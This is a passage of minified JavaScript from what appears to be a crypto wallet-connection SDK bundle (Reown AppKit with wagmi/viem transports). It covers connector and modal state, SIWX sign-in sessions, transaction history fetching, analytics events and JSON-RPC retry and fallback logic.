cleanup(){this.session=void 0,this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,this.persist("namespaces",void 0),this.persist("optionalNamespaces",void 0),this.persist("sessionProperties",void 0),await this.cleanupPendingPairings({deletePairings:!0})}persist(e,t){this.client.core.storage.setItem(`${dF}/${e}`,t)}async getFromStore(e){return await this.client.core.storage.getItem(`${dF}/${e}`)}};const fke={getFeatureValue(r,e){const t=e?.[r];return t===void 0?kr.DEFAULT_FEATURES[r]:t},filterSocialsByPlatform(r){if(!r||!r.length)return r;if(ke.isTelegram()){if(ke.isIos())return r.filter(e=>e!=="google");if(ke.isMac())return r.filter(e=>e!=="x");if(ke.isAndroid())return r.filter(e=>!["facebook","x"].includes(e))}return r}},mr=sr({features:kr.DEFAULT_FEATURES,projectId:"",sdkType:"appkit",sdkVersion:"html-wagmi-undefined",defaultAccountTypes:kr.DEFAULT_ACCOUNT_TYPES}),Ne={state:mr,subscribeKey(r,e){return ci(mr,r,e)},setOptions(r){Object.assign(mr,r)},setFeatures(r){if(!r)return;mr.features||(mr.features=kr.DEFAULT_FEATURES);const e={...mr.features,...r};mr.features=e,mr.features.socials&&(mr.features.socials=fke.filterSocialsByPlatform(mr.features.socials))},setProjectId(r){mr.projectId=r},setAllWallets(r){mr.allWallets=r},setIncludeWalletIds(r){mr.includeWalletIds=r},setExcludeWalletIds(r){mr.excludeWalletIds=r},setFeaturedWalletIds(r){mr.featuredWalletIds=r},setTokens(r){mr.tokens=r},setTermsConditionsUrl(r){mr.termsConditionsUrl=r},setPrivacyPolicyUrl(r){mr.privacyPolicyUrl=r},setCustomWallets(r){mr.customWallets=r},setIsSiweEnabled(r){mr.isSiweEnabled=r},setIsUniversalProvider(r){mr.isUniversalProvider=r},setSdkVersion(r){mr.sdkVersion=r},setMetadata(r){mr.metadata=r},setDisableAppend(r){mr.disableAppend=r},setEIP6963Enabled(r){mr.enableEIP6963=r},setDebug(r){mr.debug=r},setEnableWalletConnect(r){mr.enableWalletConnect=r},setEnableWalletGuide(r){mr.enableWalletGuide=r},setEnableAuthLogger(r){mr.enableAuthLogger=r},setEnableWallets(r){mr.enableWallets=r},setHasMultipleAddresses(r){mr.hasMultipleAddresses=r},setSIWX(r){mr.siwx=r},setConnectMethodsOrder(r){mr.features={...mr.features,connectMethodsOrder:r}},setWalletFeaturesOrder(r){mr.features={...mr.features,walletFeaturesOrder:r}},setSocialsOrder(r){mr.features={...mr.features,socials:r}},setCollapseWallets(r){mr.features={...mr.features,collapseWallets:r}},setEnableEmbedded(r){mr.enableEmbedded=r},setAllowUnsupportedChain(r){mr.allowUnsupportedChain=r},setUsingInjectedUniversalProvider(r){mr.useInjectedUniversalProvider=r},setDefaultAccountTypes(r={}){Object.entries(r).forEach(([e,t])=>{t&&(mr.defaultAccountTypes[e]=t)})},getSnapshot(){return kd(mr)}},Q0=sr({message:"",variant:"info",open:!1}),md={state:Q0,subscribeKey(r,e){return ci(Q0,r,e)},open(r,e){const{debug:t}=Ne.state,{shortMessage:i,longMessage:n}=r;t&&(Q0.message=i,Q0.variant=e,Q0.open=!0),n&&console.error(typeof n=="function"?n():n)},close(){Q0.open=!1,Q0.message="",Q0.variant="info"}},pke=ke.getAnalyticsUrl(),gke=new Xx({baseUrl:pke,clientId:null}),mke=["MODAL_CREATED"],mh=sr({timestamp:Date.now(),reportedErrors:{},data:{type:"track",event:"MODAL_CREATED"}}),Ve={state:mh,subscribe(r){return ai(mh,()=>r(mh))},getSdkProperties(){const{projectId:r,sdkType:e,sdkVersion:t}=Ne.state;return{projectId:r,st:e,sv:t||"html-wagmi-4.2.2"}},async _sendAnalyticsEvent(r){try{const e=Se.state.address;if(mke.includes(r.data.event)||typeof window>"u")return;await gke.post({path:"/e",params:Ve.getSdkProperties(),body:{eventId:ke.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:r.timestamp,props:{...r.data,address:e}}}),mh.reportedErrors.FORBIDDEN=!1}catch(e){e instanceof Error&&e.cause instanceof Response&&e.cause.status===Me.HTTP_STATUS_CODES.FORBIDDEN&&!mh.reportedErrors.FORBIDDEN&&(md.open({shortMessage:"Invalid App Configuration",longMessage:`Origin ${t5()?window.origin:"uknown"} not found on Allowlist - update configuration on cloud.reown.com`},"error"),mh.reportedErrors.FORBIDDEN=!0)}},sendEvent(r){mh.timestamp=Date.now(),mh.data=r,Ne.state.features?.analytics&&Ve._sendAnalyticsEvent(mh)}},wke={handleSolanaDeeplinkRedirect(r){if(re.state.activeChain===Me.CHAIN.SOLANA){const e=window.location.href,t=encodeURIComponent(e);if(r==="Phantom"&&!("phantom"in window)){const i=e.startsWith("https")?"https":"http",n=e.split("/")[2],s=encodeURIComponent(`${i}://${n}`);window.location.href=`https://phantom.app/ul/browse/${t}?ref=${s}`}r==="Coinbase Wallet"&&!("coinbaseSolana"in window)&&(window.location.href=`https://go.cb-w.com/dapp?cb_url=${t}`)}}},wh=sr({themeMode:"dark",themeVariables:{},w3mThemeVariables:void 0}),Mi={state:wh,subscribe(r){return ai(wh,()=>r(wh))},setThemeMode(r){wh.themeMode=r;try{const e=Xe.getAuthConnector();if(e){const t=Mi.getSnapshot().themeVariables;e.provider.syncTheme({themeMode:r,themeVariables:t,w3mThemeVariables:gd(t,r)})}}catch{console.info("Unable to sync theme to auth connector")}},setThemeVariables(r){wh.themeVariables={...wh.themeVariables,...r};try{const e=Xe.getAuthConnector();if(e){const t=Mi.getSnapshot().themeVariables;e.provider.syncTheme({themeVariables:t,w3mThemeVariables:gd(wh.themeVariables,wh.themeMode)})}}catch{console.info("Unable to sync theme to auth connector")}},getSnapshot(){return kd(wh)}},Dn=sr({allConnectors:[],connectors:[],activeConnector:void 0,filterByNamespace:void 0}),Xe={state:Dn,subscribe(r){return ai(Dn,()=>{r(Dn)})},subscribeKey(r,e){return ci(Dn,r,e)},setActiveConnector(r){r&&(Dn.activeConnector=Ra(r))},setConnectors(r){r.filter(t=>!Dn.allConnectors.some(i=>i.id===t.id&&this.getConnectorName(i.name)===this.getConnectorName(t.name)&&i.chain===t.chain)).forEach(t=>{t.type!=="MULTI_CHAIN"&&Dn.allConnectors.push(Ra(t))}),Dn.connectors=this.mergeMultiChainConnectors(Dn.allConnectors)},removeAdapter(r){Dn.allConnectors=Dn.allConnectors.filter(e=>e.chain!==r),Dn.connectors=this.mergeMultiChainConnectors(Dn.allConnectors)},mergeMultiChainConnectors(r){const e=this.generateConnectorMapByName(r),t=[];return e.forEach(i=>{const n=i[0],s=n?.id===Me.CONNECTOR_ID.AUTH;i.length>1&&n?t.push({name:n.name,imageUrl:n.imageUrl,imageId:n.imageId,connectors:[...i],type:s?"AUTH":"MULTI_CHAIN",chain:"eip155",id:n?.id||""}):n&&t.push(n)}),t},generateConnectorMapByName(r){const e=new Map;return r.forEach(t=>{const{name:i}=t,n=this.getConnectorName(i);if(!n)return;const s=e.get(n)||[];s.find(a=>a.chain===t.chain)||s.push(t),e.set(n,s)}),e},getConnectorName(r){return r&&({"Trust Wallet":"Trust"}[r]||r)},getUniqueConnectorsByName(r){const e=[];return r.forEach(t=>{e.find(i=>i.chain===t.chain)||e.push(t)}),e},addConnector(r){if(r.id===Me.CONNECTOR_ID.AUTH){const e=r,t=kd(Ne.state),i=Mi.getSnapshot().themeMode,n=Mi.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:t.metadata,sdkVersion:t.sdkVersion,projectId:t.projectId,sdkType:t.sdkType}),e?.provider?.syncTheme({themeMode:i,themeVariables:n,w3mThemeVariables:gd(n,i)}),this.setConnectors([r])}else this.setConnectors([r])},getAuthConnector(r){const e=r||re.state.activeChain,t=Dn.connectors.find(i=>i.id===Me.CONNECTOR_ID.AUTH);if(t)return t?.connectors?.length?t.connectors.find(n=>n.chain===e):t},getAnnouncedConnectorRdns(){return Dn.connectors.filter(r=>r.type==="ANNOUNCED").map(r=>r.info?.rdns)},getConnector(r,e){return Dn.connectors.find(t=>t.explorerId===r||t.info?.rdns===e)},syncIfAuthConnector(r){if(r.id!=="ID_AUTH")return;const e=r,t=kd(Ne.state),i=Mi.getSnapshot().themeMode,n=Mi.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:t.metadata,sdkVersion:t.sdkVersion,sdkType:t.sdkType,projectId:t.projectId}),e.provider.syncTheme({themeMode:i,themeVariables:n,w3mThemeVariables:gd(n,i)})},getConnectorsByNamespace(r){const e=Dn.allConnectors.filter(t=>t.chain===r);return this.mergeMultiChainConnectors(e)},selectWalletConnector(r){const e=Xe.getConnector(r.id,r.rdns);re.state.activeChain===Me.CHAIN.SOLANA&&wke.handleSolanaDeeplinkRedirect(e?.name||r.name||""),e?Ee.push("ConnectingExternal",{connector:e}):Ee.push("ConnectingWalletConnect",{wallet:r})},getConnectors(r){return r?this.getConnectorsByNamespace(r):this.mergeMultiChainConnectors(Dn.allConnectors)},setFilterByNamespace(r){Dn.filterByNamespace=r,Dn.connectors=this.getConnectors(r)},clearNamespaceFilter(){Dn.filterByNamespace=void 0,Dn.connectors=this.getConnectors()}},ki=sr({view:"Connect",history:["Connect"],transactionStack:[]}),Ee={state:ki,subscribeKey(r,e){return ci(ki,r,e)},pushTransactionStack(r){ki.transactionStack.push(r)},popTransactionStack(r){const e=ki.transactionStack.pop();if(e)if(r)this.goBack(),e?.onCancel?.();else{if(e.goBack)this.goBack();else if(e.replace){const i=ki.history.indexOf("ConnectingSiwe");i>0?this.goBackToIndex(i-1):(Ut.close(),ki.history=[])}else e.view&&this.reset(e.view);e?.onSuccess?.()}},push(r,e){r!==ki.view&&(ki.view=r,ki.history.push(r),ki.data=e)},reset(r,e){ki.view=r,ki.history=[r],ki.data=e},replace(r,e){ki.history.at(-1)===r||(ki.view=r,ki.history[ki.history.length-1]=r,ki.data=e)},goBack(){const r=!re.state.activeCaipAddress&&this.state.view==="ConnectingFarcaster";if(ki.history.length>1&&!ki.history.includes("UnsupportedChain")){ki.history.pop();const[e]=ki.history.slice(-1);e&&(ki.view=e)}else Ut.close();ki.data?.wallet&&(ki.data.wallet=void 0),setTimeout(()=>{if(r){Se.setFarcasterUrl(void 0,re.state.activeChain);const e=Xe.getAuthConnector();e?.provider?.reload();const t=kd(Ne.state);e?.provider?.syncDappData?.({metadata:t.metadata,sdkVersion:t.sdkVersion,projectId:t.projectId,sdkType:t.sdkType})}},100)},goBackToIndex(r){if(ki.history.length>1){ki.history=ki.history.slice(0,r+1);const[e]=ki.history.slice(-1);e&&(ki.view=e)}}},Xp=Object.freeze({message:"",variant:"success",svg:void 0,open:!1,autoClose:!0}),hs=sr({...Xp}),vt={state:hs,subscribeKey(r,e){return ci(hs,r,e)},showLoading(r,e={}){this._showMessage({message:r,variant:"loading",...e})},showSuccess(r){this._showMessage({message:r,variant:"success"})},showSvg(r,e){this._showMessage({message:r,svg:e})},showError(r){const e=ke.parseError(r);this._showMessage({message:e,variant:"error"})},hide(){hs.message=Xp.message,hs.variant=Xp.variant,hs.svg=Xp.svg,hs.open=Xp.open,hs.autoClose=Xp.autoClose},_showMessage({message:r,svg:e,variant:t="success",autoClose:i=Xp.autoClose}){hs.open?(hs.open=!1,setTimeout(()=>{hs.message=r,hs.variant=t,hs.svg=e,hs.open=!0,hs.autoClose=i},150)):(hs.message=r,hs.variant=t,hs.svg=e,hs.open=!0,hs.autoClose=i)}},xd={getSIWX(){return Ne.state.siwx},async initializeIfEnabled(){const r=Ne.state.siwx,e=re.getActiveCaipAddress();if(!(r&&e))return;const[t,i,n]=e.split(":");if(re.checkIfSupportedNetwork(t))try{if((await r.getSessions(`${t}:${i}`,n)).length)return;await Ut.open({view:"SIWXSignMessage"})}catch(s){console.error("SIWXUtil:initializeIfEnabled",s),Ve.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties()}),await ft._getClient()?.disconnect().catch(console.error),Ee.reset("Connect"),vt.showError("A problem occurred while trying initialize authentication")}},async requestSignMessage(){const r=Ne.state.siwx,e=ke.getPlainAddress(re.getActiveCaipAddress()),t=re.getActiveCaipNetwork(),i=ft._getClient();if(!r)throw new Error("SIWX is not enabled");if(!e)throw new Error("No ActiveCaipAddress found");if(!t)throw new Error("No ActiveCaipNetwork or client found");if(!i)throw new Error("No ConnectionController client found");try{const n=await r.createMessage({chainId:t.caipNetworkId,accountAddress:e}),s=n.toString();He.getConnectedConnectorId(t.chainNamespace)===Me.CONNECTOR_ID.AUTH&&Ee.pushTransactionStack({view:null,goBack:!1,replace:!0});const a=await i.signMessage(s);await r.addSession({data:n,message:s,signature:a}),Ut.close(),Ve.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:this.getSIWXEventProperties()})}catch(n){const s=this.getSIWXEventProperties();(!Ut.state.open||Ee.state.view==="ApproveTransaction")&&await Ut.open({view:"SIWXSignMessage"}),s.isSmartAccount?vt.showError("This application might not support Smart Accounts"):vt.showError("Signature declined"),Ve.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:s}),console.error("SWIXUtil:requestSignMessage",n)}},async cancelSignMessage(){try{this.getSIWX()?.getRequired?.()?await ft.disconnect():Ut.close(),Ee.reset("Connect"),Ve.sendEvent({event:"CLICK_CANCEL_SIWX",type:"track",properties:this.getSIWXEventProperties()})}catch(r){console.error("SIWXUtil:cancelSignMessage",r)}},async getSessions(){const r=Ne.state.siwx,e=ke.getPlainAddress(re.getActiveCaipAddress()),t=re.getActiveCaipNetwork();return r&&e&&t?r.getSessions(t.caipNetworkId,e):[]},async isSIWXCloseDisabled(){const r=this.getSIWX();if(r){const e=Ee.state.view==="ApproveTransaction",t=Ee.state.view==="SIWXSignMessage";if(e||t)return r.getRequired?.()&&(await this.getSessions()).length===0}return!1},async universalProviderAuthenticate({universalProvider:r,chains:e,methods:t}){const i=xd.getSIWX(),n=new Set(e.map(a=>a.split(":")[0]));if(!i||n.size!==1||!n.has("eip155"))return!1;const s=await i.createMessage({chainId:re.getActiveCaipNetwork()?.caipNetworkId||"",accountAddress:""}),o=await r.authenticate({nonce:s.nonce,domain:s.domain,uri:s.uri,exp:s.expirationTime,iat:s.issuedAt,nbf:s.notBefore,requestId:s.requestId,version:s.version,resources:s.resources,statement:s.statement,chainId:s.chainId,methods:t,chains:[s.chainId,...e.filter(a=>a!==s.chainId)]});if(vt.showLoading("Authenticating...",{autoClose:!1}),Se.setConnectedWalletInfo({...o.session.peer.metadata,name:o.session.peer.metadata.name,icon:o.session.peer.metadata.icons?.[0],type:"WALLET_CONNECT"},Array.from(n)[0]),o?.auths?.length){const a=o.auths.map(c=>{const l=r.client.formatAuthMessage({request:c.p,iss:c.p.iss});return{data:{...c.p,accountAddress:c.p.iss.split(":").slice(-1).join(""),chainId:c.p.iss.split(":").slice(2,4).join(":"),uri:c.p.aud,version:c.p.version||s.version,expirationTime:c.p.exp,issuedAt:c.p.iat,notBefore:c.p.nbf},message:l,signature:c.s.s,cacao:c}});try{await i.setSessions(a),Ve.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:xd.getSIWXEventProperties()})}catch(c){throw console.error("SIWX:universalProviderAuth - failed to set sessions",c),Ve.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:xd.getSIWXEventProperties()}),await r.disconnect().catch(console.error),c}finally{vt.hide()}}return!0},getSIWXEventProperties(){return{network:re.state.activeCaipNetwork?.caipNetworkId||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}},async clearSessions(){const r=this.getSIWX();r&&await r.setSessions([])}},tn=sr({transactions:[],coinbaseTransactions:{},transactionsByYear:{},lastNetworkInView:void 0,loading:!1,empty:!1,next:void 0}),vs={state:tn,subscribe(r){return ai(tn,()=>r(tn))},setLastNetworkInView(r){tn.lastNetworkInView=r},async fetchTransactions(r,e){if(!r)throw new Error("Transactions can't be fetched without an accountAddress");tn.loading=!0;try{const t=await Lt.fetchTransactions({account:r,cursor:tn.next,onramp:e,cache:e==="coinbase"?"no-cache":void 0,chainId:re.state.activeCaipNetwork?.caipNetworkId}),i=this.filterSpamTransactions(t.data),n=this.filterByConnectedChain(i),s=[...tn.transactions,...n];tn.loading=!1,e==="coinbase"?tn.coinbaseTransactions=this.groupTransactionsByYearAndMonth(tn.coinbaseTransactions,t.data):(tn.transactions=s,tn.transactionsByYear=this.groupTransactionsByYearAndMonth(tn.transactionsByYear,n)),tn.empty=s.length===0,tn.next=t.next?t.next:void 0}catch{Ve.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:r,projectId:Ne.state.projectId,cursor:tn.next,isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),vt.showError("Failed to fetch transactions"),tn.loading=!1,tn.empty=!0,tn.next=void 0}},groupTransactionsByYearAndMonth(r={},e=[]){const t=r;return e.forEach(i=>{const n=new Date(i.metadata.minedAt).getFullYear(),s=new Date(i.metadata.minedAt).getMonth(),o=t[n]??{},c=(o[s]??[]).filter(l=>l.id!==i.id);t[n]={...o,[s]:[...c,i].sort((l,u)=>new Date(u.metadata.minedAt).getTime()-new Date(l.metadata.minedAt).getTime())}}),t},filterSpamTransactions(r){return r.filter(e=>!e.transfers.every(i=>i.nft_info?.flags.is_spam===!0))},filterByConnectedChain(r){const e=re.state.activeCaipNetwork?.caipNetworkId;return r.filter(i=>i.metadata.chain===e)},clearCursor(){tn.next=void 0},resetTransactions(){tn.transactions=[],tn.transactionsByYear={},tn.lastNetworkInView=void 0,tn.loading=!1,tn.empty=!1,tn.next=void 0}},Wn=sr({wcError:!1,buffering:!1,status:"disconnected"});let z2;const ft={state:Wn,subscribeKey(r,e){return ci(Wn,r,e)},_getClient(){return Wn._client},setClient(r){Wn._client=Ra(r)},async connectWalletConnect(){if([...re.state.chains.keys()].forEach(e=>{He.setConnectedConnectorId(e,Me.CONNECTOR_ID.WALLET_CONNECT)}),ke.isTelegram()||ke.isSafari()&&ke.isIos()){if(z2){await z2,z2=void 0;return}if(!ke.isPairingExpired(Wn?.wcPairingExpiry)){const e=Wn.wcUri;Wn.wcUri=e;return}z2=this._getClient()?.connectWalletConnect?.().catch(()=>{}),this.state.status="connecting",await z2,z2=void 0,Wn.wcPairingExpiry=void 0,this.state.status="connected"}else await this._getClient()?.connectWalletConnect?.()},async connectExternal(r,e,t=!0){await this._getClient()?.connectExternal?.(r),t&&re.setActiveNamespace(e)},async reconnectExternal(r){await this._getClient()?.reconnectExternal?.(r);const e=r.chain||re.state.activeChain;e&&He.setConnectedConnectorId(e,r.id)},async setPreferredAccountType(r){Ut.setLoading(!0);const e=Xe.getAuthConnector();e&&(await e?.provider.setPreferredAccount(r),await this.reconnectExternal(e),Ut.setLoading(!1),Ve.sendEvent({type:"track",event:"SET_PREFERRED_ACCOUNT_TYPE",properties:{accountType:r,network:re.state.activeCaipNetwork?.caipNetworkId||""}}))},async signMessage(r){return this._getClient()?.signMessage(r)},parseUnits(r,e){return this._getClient()?.parseUnits(r,e)},formatUnits(r,e){return this._getClient()?.formatUnits(r,e)},async sendTransaction(r){return this._getClient()?.sendTransaction(r)},async getCapabilities(r){return this._getClient()?.getCapabilities(r)},async grantPermissions(r){return this._getClient()?.grantPermissions(r)},async walletGetAssets(r){return this._getClient()?.walletGetAssets(r)??{}},async estimateGas(r){return this._getClient()?.estimateGas(r)},async writeContract(r){return this._getClient()?.writeContract(r)},async getEnsAddress(r){return this._getClient()?.getEnsAddress(r)},async getEnsAvatar(r){return this._getClient()?.getEnsAvatar(r)},checkInstalled(r){return this._getClient()?.checkInstalled?.(r)||!1},resetWcConnection(){Wn.wcUri=void 0,Wn.wcPairingExpiry=void 0,Wn.wcLinking=void 0,Wn.recentWallet=void 0,Wn.status="disconnected",vs.resetTransactions(),He.deleteWalletConnectDeepLink()},setUri(r){Wn.wcUri=r,Wn.wcPairingExpiry=ke.getPairingExpiry()},setWcLinking(r){Wn.wcLinking=r},setWcError(r){Wn.wcError=r,Wn.buffering=!1},setRecentWallet(r){Wn.recentWallet=r},setBuffering(r){Wn.buffering=r},setStatus(r){Wn.status=r},async disconnect(){try{Ut.setLoading(!0),await xd.clearSessions(),await re.disconnect(),Ut.setLoading(!1)}catch{throw new Error("Failed to disconnect")}}},Sb=sr({loading:!1,open:!1,selectedNetworkId:void 0,activeChain:void 0,initialized:!1}),t0={state:Sb,subscribe(r){return ai(Sb,()=>r(Sb))},set(r){Object.assign(Sb,{...Sb,...r})}};function bke(){let r=()=>{},e=()=>{};return{promise:new Promise((i,n)=>{r=i,e=n}),resolve:r,reject:e}}const rA=new Map;function vke({fn:r,id:e,shouldSplitBatch:t,wait:i=0,sort:n}){const s=async()=>{const u=c();o();const d=u.map(({args:h})=>h);d.length!==0&&r(d).then(h=>{n&&Array.isArray(h)&&h.sort(n);for(let f=0;f<u.length;f++){const{resolve:p}=u[f];p?.([h[f],h])}}).catch(h=>{for(let f=0;f<u.length;f++){const{reject:p}=u[f];p?.(h)}})},o=()=>rA.delete(e),a=()=>c().map(({args:u})=>u),c=()=>rA.get(e)||[],l=u=>rA.set(e,[...c(),u]);return{flush:o,async schedule(u){const{promise:d,resolve:h,reject:f}=bke();return t?.([...a(),u])&&s(),c().length>0?(l({args:u,resolve:h,reject:f}),d):(l({args:u,resolve:h,reject:f}),setTimeout(s,i),d)}}}async function eee(r){return new Promise(e=>setTimeout(e,r))}const Dk=256;let i8=Dk,n8;function yke(r=11){if(!n8||i8+r>Dk*2){n8="",i8=0;for(let e=0;e<Dk;e++)n8+=(256+Math.random()*256|0).toString(16).substring(1)}return n8.substring(i8,i8+++r)}const s8=new D$(8192);function xke(r,{enabled:e=!0,id:t}){if(!e||!t)return r();if(s8.get(t))return s8.get(t);const i=r().finally(()=>s8.delete(t));return s8.set(t,i),i}function Cke(r,{delay:e=100,retryCount:t=2,shouldRetry:i=()=>!0}={}){return new Promise((n,s)=>{const o=async({count:a=0}={})=>{const c=async({error:l})=>{const u=typeof e=="function"?e({count:a,error:l}):e;u&&await eee(u),o({count:a+1})};try{const l=await r();n(l)}catch(l){if(a<t&&await i({count:a,error:l}))return c({error:l});s(l)}};o()})}function Eke(r,e={}){return async(t,i={})=>{const{dedupe:n=!1,methods:s,retryDelay:o=150,retryCount:a=3,uid:c}={...e,...i},{method:l}=t;if(s?.exclude?.includes(l))throw new b1(new Error("method not supported"),{method:l});if(s?.include&&!s.include.includes(l))throw new b1(new Error("method not supported"),{method:l});const u=n?EY(`${c}.${O1(t)}`):void 0;return xke(()=>Cke(async()=>{try{return await r(t)}catch(d){const h=d;switch(h.code){case dv.code:throw new dv(h);case hv.code:throw new hv(h);case fv.code:throw new fv(h,{method:t.method});case pv.code:throw new pv(h);case Cw.code:throw new Cw(h);case gv.code:throw new gv(h);case mv.code:throw new mv(h);case wv.code:throw new wv(h);case Ew.code:throw new Ew(h);case b1.code:throw new b1(h,{method:t.method});case _w.code:throw new _w(h);case bv.code:throw new bv(h);case B1.code:throw new B1(h);case vv.code:throw new vv(h);case yv.code:throw new yv(h);case xv.code:throw new xv(h);case Cv.code:throw new Cv(h);case Ev.code:throw new Ev(h);case _v.code:throw new _v(h);case Sv.code:throw new Sv(h);case Av.code:throw new Av(h);case Iv.code:throw new Iv(h);case Tv.code:throw new Tv(h);case kv.code:throw new kv(h);case Nv.code:throw new Nv(h);case 5e3:throw new B1(h);default:throw d instanceof Xt?d:new Afe(h)}}},{delay:({count:d,error:h})=>{if(h&&h instanceof E5){const f=h?.headers?.get("Retry-After");if(f?.match(/\d/))return Number.parseInt(f)*1e3}return~~(1<<d)*o},retryCount:a,shouldRetry:({error:d})=>_ke(d)}),{enabled:n,id:u})}}function _ke(r){return"code"in r&&typeof r.code=="number"?r.code===-1||r.code===_w.code||r.code===Cw.code:r instanceof E5&&r.status?r.status===403||r.status===408||r.status===413||r.status===429||r.status===500||r.status===502||r.status===503||r.status===504:!0}function tee({key:r,methods:e,name:t,request:i,retryCount:n=3,retryDelay:s=150,timeout:o,type:a},c){const l=yke();return{config:{key:r,methods:e,name:t,request:i,retryCount:n,retryDelay:s,timeout:o,type:a},request:Eke(i,{methods:e,retryCount:n,retryDelay:s,uid:l}),value:c}}function Lk(r,e={}){const{key:t="fallback",name:i="Fallback",rank:n=!1,shouldThrow:s=Ske,retryCount:o,retryDelay:a}=e;return({chain:c,pollingInterval:l=4e3,timeout:u,...d})=>{let h=r,f=()=>{};const p=tee({key:t,name:i,async request({method:g,params:w}){let m;const x=async(S=0)=>{const T=h[S]({...d,chain:c,retryCount:0,timeout:u});try{const k=await T.request({method:g,params:w});return f({method:g,params:w,response:k,transport:T,status:"success"}),k}catch(k){if(f({error:k,method:g,params:w,transport:T,status:"error"}),s(k)||S===h.length-1||(m??=h.slice(S+1).some(I=>{const{include:E,exclude:C}=I({chain:c}).config.methods||{};return E?E.includes(g):C?!C.includes(g):!0}),!m))throw k;return x(S+1)}};return x()},retryCount:o,retryDelay:a,type:"fallback"},{onResponse:g=>f=g,transports:h.map(g=>g({chain:c,retryCount:0}))});if(n){const g=typeof n=="object"?n:{};Ake({chain:c,interval:g.interval??l,onTransports:w=>h=w,ping:g.ping,sampleCount:g.sampleCount,timeout:g.timeout,transports:h,weights:g.weights})}return p}}function Ske(r){return!!("code"in r&&typeof r.code=="number"&&(r.code===Ew.code||r.code===B1.code||w1.nodeMessage.test(r.message)||r.code===5e3))}function Ake({chain:r,interval:e=4e3,onTransports:t,ping:i,sampleCount:n=10,timeout:s=1e3,transports:o,weights:a={}}){const{stability:c=.7,latency:l=.3}=a,u=[],d=async()=>{const h=await Promise.all(o.map(async g=>{const w=g({chain:r,retryCount:0,timeout:s}),m=Date.now();let x,S;try{await(i?i({transport:w}):w.request({method:"net_listening"})),S=1}catch{S=0}finally{x=Date.now()}return{latency:x-m,success:S}}));u.push(h),u.length>n&&u.shift();const f=Math.max(...u.map(g=>Math.max(...g.map(({latency:w})=>w)))),p=o.map((g,w)=>{const m=u.map(I=>I[w].latency),S=1-m.reduce((I,E)=>I+E,0)/m.length/f,T=u.map(I=>I[w].success),k=T.reduce((I,E)=>I+E,0)/T.length;return k===0?[0,w]:[l*S+c*k,w]}).sort((g,w)=>w[0]-g[0]);t(p.map(([,g])=>o[g])),await eee(e),d()};d()}class Ike extends Xt{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro",name:"UrlRequiredError"})}}function Tke(r,{errorInstance:e=new Error("timed out"),timeout:t,signal:i}){return new Promise((n,s)=>{(async()=>{let o;try{const a=new AbortController;t>0&&(o=setTimeout(()=>{i&&a.abort()},t)),n(await r({signal:a?.signal||null}))}catch(a){a?.name==="AbortError"&&s(e),s(a)}finally{clearTimeout(o)}})()})}function kke(){return{current:0,take(){return this.current++},reset(){this.current=0}}}const jF=kke();function Nke(r,e={}){return{async request(t){const{body:i,onRequest:n=e.onRequest,onResponse:s=e.onResponse,timeout:o=e.timeout??1e4}=t,a={...e.fetchOptions??{},...t.fetchOptions??{}},{headers:c,method:l,signal:u}=a;try{const d=await Tke(async({signal:f})=>{const p={...a,body:Array.isArray(i)?O1(i.map(x=>({jsonrpc:"2.0",id:x.id??jF.take(),...x}))):O1({jsonrpc:"2.0",id:i.id??jF.take(),...i}),headers:{"Content-Type":"application/json",...c},method:l||"POST",signal:u||(o>0?f:null)},g=new Request(r,p),w=await n?.(g,p)??{...p,url:r};return await fetch(w.url??r,w)},{errorInstance:new fD({body:i,url:r}),timeout:o,signal:!0});s&&await s(d);let h;if(d.headers.get("Content-Type")?.startsWith("application/json"))h=await d.json();else{h=await d.text();try{h=JSON.parse(h||"{}")}catch(f){if(d.ok)throw f;h={error:h}}}if(!d.ok)throw new E5({body:i,details:O1(h.error)||d.statusText,headers:d.headers,status:d.status,url:r});return h}catch(d){throw d instanceof E5||d instanceof fD?d:new E5({body:i,cause:d,url:r})}}}}function y1(r,e={}){const{batch:t,fetchOptions:i,key:n="http",methods:s,name:o="HTTP JSON-RPC",onFetchRequest:a,onFetchResponse:c,retryDelay:l,raw:u}=e;return({chain:d,retryCount:h,timeout:f})=>{const{batchSize:p=1e3,wait:g=0}=typeof t=="object"?t:{},w=e.retryCount??h,m=f??e.timeout??1e4,x=r||d?.rpcUrls.default.http[0];if(!x)throw new Ike;const S=Nke(x,{fetchOptions:i,onRequest:a,onResponse:c,timeout:m});return tee({key:n,methods:s,name:o,async request({method:T,params:k}){const I={method:T,params:k},{schedule:E}=vke({id:x,wait:g,shouldSplitBatch($){return $.length>p},fn:$=>S.request({body:$}),sort:($,y)=>$.id-y.id}),C=async $=>t?E($):[await S.request({body:$})],[{error:N,result:L}]=await C(I);if(u)return{error:N,result:L};if(N)throw new cJ({body:I,error:N,url:x});return L},retryCount:w,retryDelay:l,timeout:m,type:"http"},{fetchOptions:i,url:x})}}let ree=class extends B${constructor(e,t){super(),this.finished=!1,this.destroyed=!1,_he(e);const i=Kx(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,s=new Uint8Array(n);s.set(i.length>n?e.create().update(i).digest():i);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),yw(s)}update(e){return vw(this),this.iHash.update(e),this}digestInto(e){vw(this),rp(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return 